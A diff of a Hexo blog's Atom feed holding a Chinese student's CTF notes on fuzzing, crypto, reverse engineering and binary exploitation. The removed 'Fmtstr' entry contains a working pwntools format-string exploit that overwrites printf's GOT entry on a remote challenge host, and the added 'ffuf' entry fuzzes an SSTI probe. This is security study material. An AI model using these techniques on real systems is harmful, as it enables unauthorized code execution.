@@ -6,7 +6,7 @@
   <link href="http://example.com/atom.xml" rel="self"/>
   
   <link href="http://example.com/"/>
-  <updated>2024-07-25T06:08:56.000Z</updated>
+  <updated>2024-08-02T06:17:37.000Z</updated>
   <id>http://example.com/</id>
   
   <author>
@@ -17,9 +17,214 @@
   <generator uri="https://hexo.io/">Hexo</generator>
   
   <entry>
+    <title>ffuf</title>
+    <link href="http://example.com/2024/08/02/Web/%E5%B7%A5%E5%85%B7/fuzz/ffuf/"/>
+    <id>http://example.com/2024/08/02/Web/%E5%B7%A5%E5%85%B7/fuzz/ffuf/</id>
+    <published>2024-08-02T06:08:19.000Z</published>
+    <updated>2024-08-02T06:17:37.000Z</updated>
+    
+    <content type="html"><![CDATA[<p><code>go install github.com/ffuf/ffuf@latest</code></p><p>过滤353大小的字符</p><div class="highlight-container" data-rel="Sh"><figure class="iseeu highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ffuf -w /usr/share/wordlists/rockyou.txt -u http://node5.anna.nssctf.cn:21990/?FUZZ=&#123;7*9&#125; -fs 353</span><br></pre></td></tr></table></figure></div><p>-fc</p><p>过滤对应的response code</p>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;p&gt;&lt;code&gt;go install github.com/ffuf/ffuf@latest&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;过滤353大小的字符&lt;/p&gt;
+&lt;div class=&quot;highlight-container&quot; data-rel=&quot;Sh&quot;&gt;&lt;figure class=&quot;i</summary>
+      
+    
+    
+    
+    <category term="Web" scheme="http://example.com/categories/Web/"/>
+    
+    <category term="工具" scheme="http://example.com/categories/Web/%E5%B7%A5%E5%85%B7/"/>
+    
+    <category term="fuzz" scheme="http://example.com/categories/Web/%E5%B7%A5%E5%85%B7/fuzz/"/>
+    
+    
+  </entry>
+  
+  <entry>
+    <title>fenjing</title>
+    <link href="http://example.com/2024/08/02/Web/%E5%B7%A5%E5%85%B7/fenjing/"/>
+    <id>http://example.com/2024/08/02/Web/%E5%B7%A5%E5%85%B7/fenjing/</id>
+    <published>2024-08-02T05:55:42.000Z</published>
+    <updated>2024-08-02T06:04:34.000Z</updated>
+    
+    <content type="html"><![CDATA[<p>搞SSTI非常好</p><p><code>pip install fenjing</code></p>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;p&gt;搞SSTI非常好&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;pip install fenjing&lt;/code&gt;&lt;/p&gt;
+</summary>
+      
+    
+    
+    
+    <category term="Web" scheme="http://example.com/categories/Web/"/>
+    
+    <category term="工具" scheme="http://example.com/categories/Web/%E5%B7%A5%E5%85%B7/"/>
+    
+    
+  </entry>
+  
+  <entry>
+    <title>汉明距离</title>
+    <link href="http://example.com/2024/07/31/Crypto/%E5%BE%85%E5%AD%A6/%E6%B1%89%E6%98%8E%E8%B7%9D%E7%A6%BB/"/>
+    <id>http://example.com/2024/07/31/Crypto/%E5%BE%85%E5%AD%A6/%E6%B1%89%E6%98%8E%E8%B7%9D%E7%A6%BB/</id>
+    <published>2024-07-31T07:30:57.000Z</published>
+    <updated>2024-07-31T07:31:04.000Z</updated>
+    
+    <content type="html"><![CDATA[<p><a class="link"   href="https://www.jianshu.com/p/ecd767d9af0d" >2019-De1CTF-xorz - 简书 (jianshu.com) <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;p&gt;&lt;a class=&quot;link&quot;   href=&quot;https://www.jianshu.com/p/ecd767d9af0d&quot; &gt;2019-De1CTF-xorz - 简书 (jianshu.com) &lt;i class=&quot;fa-regular fa-arrow-up-rig</summary>
+      
+    
+    
+    
+    <category term="Crypto" scheme="http://example.com/categories/Crypto/"/>
+    
+    <category term="待学" scheme="http://example.com/categories/Crypto/%E5%BE%85%E5%AD%A6/"/>
+    
+    
+  </entry>
+  
+  <entry>
+    <title>index1</title>
+    <link href="http://example.com/2024/07/31/Crypto/%E5%BE%85%E5%AD%A6/index1/"/>
+    <id>http://example.com/2024/07/31/Crypto/%E5%BE%85%E5%AD%A6/index1/</id>
+    <published>2024-07-30T18:43:35.000Z</published>
+    <updated>2024-07-30T18:46:57.000Z</updated>
+    
+    <content type="html"><![CDATA[<p><a class="link"   href="https://www.cnblogs.com/JustGo12/p/18009944" >L3HCTF 2024 -Cry部分 - JustG0 - 博客园 (cnblogs.com) <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p><p><a class="link"   href="https://cn-sec.com/archives/474106.html" >2021第二届祥云杯Crypto部分Write-Up全 | CN-SEC 中文网 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;p&gt;&lt;a class=&quot;link&quot;   href=&quot;https://www.cnblogs.com/JustGo12/p/18009944&quot; &gt;L3HCTF 2024 -Cry部分 - JustG0 - 博客园 (cnblogs.com) &lt;i class=&quot;fa-regula</summary>
+      
+    
+    
+    
+    <category term="Crypto" scheme="http://example.com/categories/Crypto/"/>
+    
+    <category term="待学" scheme="http://example.com/categories/Crypto/%E5%BE%85%E5%AD%A6/"/>
+    
+    
+  </entry>
+  
+  <entry>
+    <title>sieve_base</title>
+    <link href="http://example.com/2024/07/31/Crypto/RSA/sieve_base/"/>
+    <id>http://example.com/2024/07/31/Crypto/RSA/sieve_base/</id>
+    <published>2024-07-30T18:24:53.000Z</published>
+    <updated>2024-07-30T18:25:01.000Z</updated>
+    
+    <content type="html"><![CDATA[<p>[<a class="link"   href="https://blog.csdn.net/shshss64/article/details/127171266" >NCTF2019]childRSA（费马定理）-CSDN博客 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;p&gt;[&lt;a class=&quot;link&quot;   href=&quot;https://blog.csdn.net/shshss64/article/details/127171266&quot; &gt;NCTF2019]childRSA（费马定理）-CSDN博客 &lt;i class=&quot;fa-regular f</summary>
+      
+    
+    
+    
+    <category term="Crypto" scheme="http://example.com/categories/Crypto/"/>
+    
+    <category term="RSA" scheme="http://example.com/categories/Crypto/RSA/"/>
+    
+    
+  </entry>
+  
+  <entry>
+    <title>基本用法</title>
+    <link href="http://example.com/2024/07/30/Re/%E5%88%86%E6%9E%90%E5%B7%A5%E5%85%B7/windbg/%E5%9F%BA%E6%9C%AC%E7%94%A8%E6%B3%95/"/>
+    <id>http://example.com/2024/07/30/Re/%E5%88%86%E6%9E%90%E5%B7%A5%E5%85%B7/windbg/%E5%9F%BA%E6%9C%AC%E7%94%A8%E6%B3%95/</id>
+    <published>2024-07-30T13:50:40.000Z</published>
+    <updated>2024-07-30T13:50:45.000Z</updated>
+    
+    <content type="html"><![CDATA[<p>[<a class="link"   href="https://bbs.kanxue.com/thread-250670.htm#%E6%A0%87%E5%87%86%E5%91%BD%E4%BB%A4" >原创]Windbg新手入坑指南-软件逆向-看雪-安全社区|安全招聘|kanxue.com <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;p&gt;[&lt;a class=&quot;link&quot;   href=&quot;https://bbs.kanxue.com/thread-250670.htm#%E6%A0%87%E5%87%86%E5%91%BD%E4%BB%A4&quot; &gt;原创]Windbg新手入坑指南-软件逆向-看雪-安全社区|安全招</summary>
+      
+    
+    
+    
+    <category term="Re" scheme="http://example.com/categories/Re/"/>
+    
+    <category term="分析工具" scheme="http://example.com/categories/Re/%E5%88%86%E6%9E%90%E5%B7%A5%E5%85%B7/"/>
+    
+    <category term="windbg" scheme="http://example.com/categories/Re/%E5%88%86%E6%9E%90%E5%B7%A5%E5%85%B7/windbg/"/>
+    
+    
+  </entry>
+  
+  <entry>
+    <title>tool</title>
+    <link href="http://example.com/2024/07/30/Crypto/%E6%A0%BC%E5%AF%86%E7%A0%81/tool/"/>
+    <id>http://example.com/2024/07/30/Crypto/%E6%A0%BC%E5%AF%86%E7%A0%81/tool/</id>
+    <published>2024-07-30T09:40:45.000Z</published>
+    <updated>2024-07-30T09:40:51.000Z</updated>
+    
+    <content type="html"><![CDATA[<p><a class="link"   href="https://github.com/keeganryan/flatter" >keeganryan&#x2F;flatter: Fast lattice reduction (github.com) <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;p&gt;&lt;a class=&quot;link&quot;   href=&quot;https://github.com/keeganryan/flatter&quot; &gt;keeganryan&amp;#x2F;flatter: Fast lattice reduction (github.com) &lt;i class=&quot;fa</summary>
+      
+    
+    
+    
+    <category term="Crypto" scheme="http://example.com/categories/Crypto/"/>
+    
+    <category term="格密码" scheme="http://example.com/categories/Crypto/%E6%A0%BC%E5%AF%86%E7%A0%81/"/>
+    
+    
+  </entry>
+  
+  <entry>
+    <title>天堂之门</title>
+    <link href="http://example.com/2024/07/30/Re/windows/pe/%E5%A4%A9%E5%A0%82%E4%B9%8B%E9%97%A8/"/>
+    <id>http://example.com/2024/07/30/Re/windows/pe/%E5%A4%A9%E5%A0%82%E4%B9%8B%E9%97%A8/</id>
+    <published>2024-07-30T05:28:32.000Z</published>
+    <updated>2024-07-31T07:31:03.000Z</updated>
+    
+    <content type="html"><![CDATA[<p>在windows环境下，有win32和x64两种环境，用于区分它们的则是CS寄存器状态(起始时的CS是由pe文件的架构来定的)</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://cdn.jsdelivr.net/gh/runwu2204/Blog_imgs/202407301347825.png"                      alt="image-20240730134744662"                ></p><p>exp题目 <a class="link"   href="https://www.cnblogs.com/lordtianqiyi/articles/16501516.html" >天堂之门 - TLSN - 博客园 (cnblogs.com) <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;p&gt;在windows环境下，有win32和x64两种环境，用于区分它们的则是CS寄存器状态(起始时的CS是由pe文件的架构来定的)&lt;/p&gt;
+&lt;p&gt;&lt;img  
+                     lazyload
+                     src=&quot;/im</summary>
+      
+    
+    
+    
+    <category term="Re" scheme="http://example.com/categories/Re/"/>
+    
+    <category term="windows" scheme="http://example.com/categories/Re/windows/"/>
+    
+    <category term="pe" scheme="http://example.com/categories/Re/windows/pe/"/>
+    
+    
+  </entry>
+  
+  <entry>
     <title>Gobuster</title>
-    <link href="http://example.com/2024/07/25/Web/%E5%B7%A5%E5%85%B7/Gobuster/"/>
-    <id>http://example.com/2024/07/25/Web/%E5%B7%A5%E5%85%B7/Gobuster/</id>
+    <link href="http://example.com/2024/07/25/Web/%E5%B7%A5%E5%85%B7/fuzz/Gobuster/"/>
+    <id>http://example.com/2024/07/25/Web/%E5%B7%A5%E5%85%B7/fuzz/Gobuster/</id>
     <published>2024-07-25T06:06:59.000Z</published>
     <updated>2024-07-25T06:08:56.000Z</updated>
     
@@ -37,6 +242,8 @@
     <category term="Web" scheme="http://example.com/categories/Web/"/>
     
     <category term="工具" scheme="http://example.com/categories/Web/%E5%B7%A5%E5%85%B7/"/>
+    
+    <category term="fuzz" scheme="http://example.com/categories/Web/%E5%B7%A5%E5%85%B7/fuzz/"/>
     
     
   </entry>
@@ -198,8 +405,8 @@
   
   <entry>
     <title>hook</title>
-    <link href="http://example.com/2024/06/27/Re/pyd/hook/"/>
-    <id>http://example.com/2024/06/27/Re/pyd/hook/</id>
+    <link href="http://example.com/2024/06/27/Re/%E8%AF%AD%E8%A8%80%E9%80%86%E5%90%91/pyd/hook/"/>
+    <id>http://example.com/2024/06/27/Re/%E8%AF%AD%E8%A8%80%E9%80%86%E5%90%91/pyd/hook/</id>
     <published>2024-06-27T08:58:37.000Z</published>
     <updated>2024-06-27T14:56:32.000Z</updated>
     
@@ -215,7 +422,9 @@
     
     <category term="Re" scheme="http://example.com/categories/Re/"/>
     
-    <category term="pyd" scheme="http://example.com/categories/Re/pyd/"/>
+    <category term="语言逆向" scheme="http://example.com/categories/Re/%E8%AF%AD%E8%A8%80%E9%80%86%E5%90%91/"/>
+    
+    <category term="pyd" scheme="http://example.com/categories/Re/%E8%AF%AD%E8%A8%80%E9%80%86%E5%90%91/pyd/"/>
     
     
   </entry>
@@ -329,222 +538,6 @@ B--&gt;C[JNI_Onload]&lt;/pre&gt;
     <category term="开发" scheme="http://example.com/categories/%E5%BC%80%E5%8F%91/"/>
     
     <category term="安卓开发" scheme="http://example.com/categories/%E5%BC%80%E5%8F%91/%E5%AE%89%E5%8D%93%E5%BC%80%E5%8F%91/"/>
-    
-    
-  </entry>
-  
-  <entry>
-    <title>golang_jar</title>
-    <link href="http://example.com/2024/06/10/%E5%BC%80%E5%8F%91/%E5%AE%89%E5%8D%93%E5%BC%80%E5%8F%91/golang_jar/"/>
-    <id>http://example.com/2024/06/10/%E5%BC%80%E5%8F%91/%E5%AE%89%E5%8D%93%E5%BC%80%E5%8F%91/golang_jar/</id>
-    <published>2024-06-10T12:27:51.000Z</published>
-    <updated>2024-06-10T12:28:05.000Z</updated>
-    
-    <content type="html"><![CDATA[<p>gomobile</p>]]></content>
-    
-    
-      
-      
-    <summary type="html">&lt;p&gt;gomobile&lt;/p&gt;
-</summary>
-      
-    
-    
-    
-    <category term="开发" scheme="http://example.com/categories/%E5%BC%80%E5%8F%91/"/>
-    
-    <category term="安卓开发" scheme="http://example.com/categories/%E5%BC%80%E5%8F%91/%E5%AE%89%E5%8D%93%E5%BC%80%E5%8F%91/"/>
-    
-    
-  </entry>
-  
-  <entry>
-    <title>Fmtstr</title>
-    <link href="http://example.com/2024/06/09/Pwn/linux/Fmtstr/"/>
-    <id>http://example.com/2024/06/09/Pwn/linux/Fmtstr/</id>
-    <published>2024-06-09T15:36:36.000Z</published>
-    <updated>2024-06-09T18:57:15.000Z</updated>
-    
-    <content type="html"><![CDATA[<p>主要利用<code>printf(&quot;用户输入&quot;)</code>达成任意地址读写</p><p>写入主要使用 <code>%n</code>占位符(将该占位符之前的字符数输出到对应地址)</p><blockquote><table><thead><tr><th>占位符</th><th>字节数</th></tr></thead><tbody><tr><td>%lln</td><td>8</td></tr><tr><td>%n</td><td>4</td></tr><tr><td>%hn</td><td>2</td></tr><tr><td>%hhn</td><td>1</td></tr></tbody></table></blockquote><p>再结合%数字$占位符</p><p>例如</p><blockquote><p>%2$s 指的就是第二个参数当作s输出</p></blockquote><p>结合这两个，如果我要写入一个’a’(0x61)到对应地址0x12345678，假设此时我的字符串在偏移3</p><p>就可以用<code>&quot;\x78\x56\x34\x12%93c%3$n&quot;</code>payload不唯一，可学习下pwntools中FmtStr的输出</p><p>Example</p><blockquote><p>[<a class="link"   href="https://www.nssctf.cn/problem/3332" >MoeCTF 2022]babyfmt | NSSCTF <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p><p>主要逻辑</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">int __cdecl __noreturn main(int argc, const char **argv, const char **envp)</span><br><span class="line">&#123;</span><br><span class="line">  char *s; // [esp+18h] [ebp-110h]</span><br><span class="line">  char buf[256]; // [esp+1Ch] [ebp-10Ch] BYREF</span><br><span class="line">  unsigned int v5; // [esp+11Ch] [ebp-Ch]</span><br><span class="line"></span><br><span class="line">  v5 = __readgsdword(0x14u);</span><br><span class="line">  setvbuf(stdin, 0, 2, 0);</span><br><span class="line">  setvbuf(stdout, 0, 2, 0);</span><br><span class="line">  setvbuf(stderr, 0, 2, 0);</span><br><span class="line">  s = (char *)malloc(0x10u);</span><br><span class="line">  sprintf(s, &quot;%p&quot;, backdoor);</span><br><span class="line">  printf(&quot;gift: %p\n&quot;, s);</span><br><span class="line">  while ( 1 )</span><br><span class="line">  &#123;</span><br><span class="line">    memset(buf, 0, sizeof(buf));</span><br><span class="line">    read(0, buf, 0xFFu);</span><br><span class="line">    printf(buf);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>exp:</p><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span>*</span><br><span class="line">elf=ELF(<span class="string">r&quot;/home/wrwrw/vscode/pwn/fmtstr/pwn&quot;</span>)</span><br><span class="line">debug=<span class="literal">False</span></span><br><span class="line"><span class="keyword">if</span> debug==<span class="literal">True</span>:</span><br><span class="line">    p=process(<span class="string">r&#x27;/home/wrwrw/vscode/pwn/fmtstr/pwn&#x27;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p=remote(<span class="string">&quot;node5.anna.nssctf.cn&quot;</span> ,<span class="number">24923</span> )</span><br><span class="line"></span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;i386&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>,terminal=<span class="string">&#x27;bash&#x27;</span>,endian = <span class="string">&quot;little&quot;</span>)<span class="comment">#需要设定对应的架构和端序才能正常使用fmtstr</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">fmtstr_read</span>(<span class="params">offset,addr,<span class="built_in">type</span></span>):</span><br><span class="line">    <span class="keyword">return</span> p32(addr)+(<span class="string">f&#x27;%<span class="subst">&#123;offset&#125;</span>$<span class="subst">&#123;<span class="built_in">type</span>&#125;</span>&#x27;</span>).encode() <span class="keyword">if</span> context.bits==<span class="number">32</span> <span class="keyword">else</span> p64(addr)+(<span class="string">f&#x27;%<span class="subst">&#123;offset&#125;</span>$<span class="subst">&#123;<span class="built_in">type</span>&#125;</span>&#x27;</span>).encode()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exec_fmt</span>(<span class="params">payload</span>):<span class="comment">#用于给FmtStr测试对应的我们input字符串的offset(相对于printf函数体内的栈顶)</span></span><br><span class="line">    p.sendline(payload)<span class="comment">#这是最简单的情况,其他的可能会结合判断语句什么的可根据这个适当修改</span></span><br><span class="line">    info = p.recv()</span><br><span class="line">    <span class="keyword">return</span> info<span class="comment">#FmtStr只需要获得对应输入的printf输出即可</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    </span><br><span class="line">    gift_addr=<span class="built_in">int</span>(re.search(<span class="string">r&quot;gift: 0x([0-9a-f]*)&quot;</span>,p.recvline().decode().strip()).group(<span class="number">1</span>),<span class="number">16</span>)<span class="comment">#获取对应backdoor地址字符串的地址</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">hex</span>(gift_addr))</span><br><span class="line">    printf_got=elf.got[<span class="string">&quot;printf&quot;</span>]</span><br><span class="line">    fmt=FmtStr(exec_fmt)</span><br><span class="line">    p.send(fmtstr_read(fmt.offset,gift_addr,<span class="string">&#x27;s&#x27;</span>))<span class="comment">#获取对应backdoor地址</span></span><br><span class="line">    backdoor_addr=<span class="built_in">int</span>(p.recv()[<span class="number">4</span>:].decode(),<span class="number">16</span>)</span><br><span class="line">    payload=fmtstr_payload(fmt.offset,&#123;printf_got:backdoor_addr&#125;)<span class="comment">#将printf_got地址上写入backdoor_addr地址(大小取决于架构)</span></span><br><span class="line">    <span class="built_in">print</span>(payload)</span><br><span class="line">    p.send(payload)</span><br><span class="line">    p.interactive()</span><br></pre></td></tr></table></figure></div></blockquote>]]></content>
-    
-    
-      
-      
-    <summary type="html">&lt;p&gt;主要利用&lt;code&gt;printf(&amp;quot;用户输入&amp;quot;)&lt;/code&gt;达成任意地址读写&lt;/p&gt;
-&lt;p&gt;写入主要使用 &lt;code&gt;%n&lt;/code&gt;占位符(将该占位符之前的字符数输出到对应地址)&lt;/p&gt;
-&lt;blockquote&gt;
-&lt;table&gt;
-&lt;thead&gt;
-&lt;</summary>
-      
-    
-    
-    
-    <category term="Pwn" scheme="http://example.com/categories/Pwn/"/>
-    
-    <category term="linux" scheme="http://example.com/categories/Pwn/linux/"/>
-    
-    
-  </entry>
-  
-  <entry>
-    <title>操作</title>
-    <link href="http://example.com/2024/06/08/Pwn/linux/tool/pwndbg/%E6%93%8D%E4%BD%9C/"/>
-    <id>http://example.com/2024/06/08/Pwn/linux/tool/pwndbg/%E6%93%8D%E4%BD%9C/</id>
-    <published>2024-06-08T10:48:34.000Z</published>
-    <updated>2024-06-08T17:26:28.000Z</updated>
-    
-    <content type="html"><![CDATA[<p><a class="link"   href="https://www.cnblogs.com/murkuo/p/15965270.html" >pwndbg 基本操作指令 - MuRKuo - 博客园 (cnblogs.com) <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p><p><a class="link"   href="https://www.bookstack.cn/read/CTF-All-In-One/doc-2.3.1_gdb.md#gdb-%E5%9F%BA%E6%9C%AC%E6%93%8D%E4%BD%9C" >动态分析工具 - 2.3.1 GDB - 《CTF 竞赛入门指南(CTF All In One)》 - 书栈网 · BookStack <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>]]></content>
-    
-    
-      
-      
-    <summary type="html">&lt;p&gt;&lt;a class=&quot;link&quot;   href=&quot;https://www.cnblogs.com/murkuo/p/15965270.html&quot; &gt;pwndbg 基本操作指令 - MuRKuo - 博客园 (cnblogs.com) &lt;i class=&quot;fa-regular </summary>
-      
-    
-    
-    
-    <category term="Pwn" scheme="http://example.com/categories/Pwn/"/>
-    
-    <category term="linux" scheme="http://example.com/categories/Pwn/linux/"/>
-    
-    <category term="tool" scheme="http://example.com/categories/Pwn/linux/tool/"/>
-    
-    <category term="pwndbg" scheme="http://example.com/categories/Pwn/linux/tool/pwndbg/"/>
-    
-    
-  </entry>
-  
-  <entry>
-    <title>堆结构</title>
-    <link href="http://example.com/2024/06/08/Pwn/linux/%E5%A0%86/%E5%A0%86%E7%BB%93%E6%9E%84/"/>
-    <id>http://example.com/2024/06/08/Pwn/linux/%E5%A0%86/%E5%A0%86%E7%BB%93%E6%9E%84/</id>
-    <published>2024-06-08T09:02:22.000Z</published>
-    <updated>2024-06-08T10:20:18.000Z</updated>
-    
-    <content type="html"><![CDATA[<p>已经申请的堆结构类似于下面</p><div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">chunk</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="type">int</span> prev_size;</span><br><span class="line">    <span class="class"><span class="keyword">union</span></span></span><br><span class="line"><span class="class">    &#123;</span></span><br><span class="line">        <span class="type">int</span> size;<span class="comment">//注意4字节对齐,&amp;表示整过</span></span><br><span class="line">    <span class="class"><span class="keyword">union</span></span></span><br><span class="line"><span class="class">    &#123;</span></span><br><span class="line">        <span class="type">int</span> flag:<span class="number">3</span>;</span><br><span class="line">            <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">            &#123;</span></span><br><span class="line">            <span class="type">bool</span> PREV_INUSE:<span class="number">1</span>;<span class="comment">//如果前面一个chunk处于分配状态，那么此位为1。一般来说，堆中第一个被分配的内存块的 size 字段的 P 位都会被设置为 1，以便于防止访问前面的非法内存。当一个chunk 的size 的P位为0时，我们能通过 prev_size 字段来获取上一个 chunk 的大小以及地址。这也方便进行空闲chunk之间的合并</span></span><br><span class="line">            <span class="type">bool</span> IS_MAPPED:<span class="number">1</span>;<span class="comment">//记录当前chunk是否是由mmap分配的</span></span><br><span class="line">            <span class="type">bool</span> NON_MAIN_AREA:<span class="number">1</span>;<span class="comment">//记录当前 chunk 是否不属于主线程</span></span><br><span class="line">            &#125;;</span><br><span class="line">    &#125;;</span><br><span class="line">&#125;;</span><br><span class="line">    <span class="type">char</span>* data[(size&amp;<span class="number">0xFFFFFFF8</span>)<span class="number">-8</span>];<span class="comment">//只取高29位</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></div>]]></content>
-    
-    
-      
-      
-    <summary type="html">&lt;p&gt;已经申请的堆结构类似于下面&lt;/p&gt;
-&lt;div class=&quot;highlight-container&quot; data-rel=&quot;C&quot;&gt;&lt;figure class=&quot;iseeu highlight c&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;spa</summary>
-      
-    
-    
-    
-    <category term="Pwn" scheme="http://example.com/categories/Pwn/"/>
-    
-    <category term="linux" scheme="http://example.com/categories/Pwn/linux/"/>
-    
-    <category term="堆" scheme="http://example.com/categories/Pwn/linux/%E5%A0%86/"/>
-    
-    
-  </entry>
-  
-  <entry>
-    <title>api</title>
-    <link href="http://example.com/2024/06/07/Web/Python/api/"/>
-    <id>http://example.com/2024/06/07/Web/Python/api/</id>
-    <published>2024-06-07T08:23:29.000Z</published>
-    <updated>2024-06-07T08:24:05.000Z</updated>
-    
-    <content type="html"><![CDATA[<p>os.path.join</p><p>以最后出现&#x2F;的字符串为基地址</p>]]></content>
-    
-    
-      
-      
-    <summary type="html">&lt;p&gt;os.path.join&lt;/p&gt;
-&lt;p&gt;以最后出现&amp;#x2F;的字符串为基地址&lt;/p&gt;
-</summary>
-      
-    
-    
-    
-    <category term="Web" scheme="http://example.com/categories/Web/"/>
-    
-    <category term="Python" scheme="http://example.com/categories/Web/Python/"/>
-    
-    
-  </entry>
-  
-  <entry>
-    <title>openat</title>
-    <link href="http://example.com/2024/06/07/Pwn/linux/api/openat/"/>
-    <id>http://example.com/2024/06/07/Pwn/linux/api/openat/</id>
-    <published>2024-06-07T07:30:00.000Z</published>
-    <updated>2024-06-07T07:37:14.000Z</updated>
-    
-    <content type="html"><![CDATA[<p>open函数原型</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">int openat(int dirfd, const char *pathname, int flags);</span><br><span class="line">int openat(int dirfd, const char *pathname, int flags, mode_t mode);</span><br></pre></td></tr></table></figure></div><p>fd参数如下</p><p><a class="link"   href="https://docs.huihoo.com/doxygen/linux/kernel/3.7/include_2uapi_2linux_2fcntl_8h.html" >Linux 内核：include&#x2F;uapi&#x2F;linux&#x2F;fcntl.h 文件参考 (huihoo.com) <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AT_FDCWD -100</span><br></pre></td></tr></table></figure></div>]]></content>
-    
-    
-      
-      
-    <summary type="html">&lt;p&gt;open函数原型&lt;/p&gt;
-&lt;div class=&quot;highlight-container&quot; data-rel=&quot;Plaintext&quot;&gt;&lt;figure class=&quot;iseeu highlight plaintext&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter</summary>
-      
-    
-    
-    
-    <category term="Pwn" scheme="http://example.com/categories/Pwn/"/>
-    
-    <category term="linux" scheme="http://example.com/categories/Pwn/linux/"/>
-    
-    <category term="api" scheme="http://example.com/categories/Pwn/linux/api/"/>
-    
-    
-  </entry>
-  
-  <entry>
-    <title>seccomp</title>
-    <link href="http://example.com/2024/06/07/Pwn/linux/%E4%BF%9D%E6%8A%A4%E6%8E%AA%E6%96%BD/seccomp/"/>
-    <id>http://example.com/2024/06/07/Pwn/linux/%E4%BF%9D%E6%8A%A4%E6%8E%AA%E6%96%BD/seccomp/</id>
-    <published>2024-06-07T07:22:14.000Z</published>
-    <updated>2024-06-08T18:13:20.000Z</updated>
-    
-    <content type="html"><![CDATA[<p>Sandbox的安全机制，用于限制系统调用</p><p>可用seccomp-tools 来查看是否启用对应的沙箱检测</p><p><code>seccomp-tools dump 对应程序</code></p>]]></content>
-    
-    
-      
-      
-    <summary type="html">&lt;p&gt;Sandbox的安全机制，用于限制系统调用&lt;/p&gt;
-&lt;p&gt;可用seccomp-tools 来查看是否启用对应的沙箱检测&lt;/p&gt;
